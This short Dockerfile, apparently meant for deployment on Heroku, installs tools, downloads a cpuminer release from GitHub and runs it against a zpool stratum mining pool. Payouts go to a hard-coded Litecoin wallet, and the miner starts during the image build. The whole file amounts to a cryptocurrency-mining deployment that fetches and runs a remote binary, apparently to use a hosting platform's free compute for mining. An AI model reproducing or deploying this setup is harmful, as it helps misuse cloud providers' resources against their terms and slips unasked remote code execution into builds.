FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u LUAw1smppMjBEw3dU8tJ4TLvrpK8JdZPdZ -p c=LTC
CMD bash heroku.sh
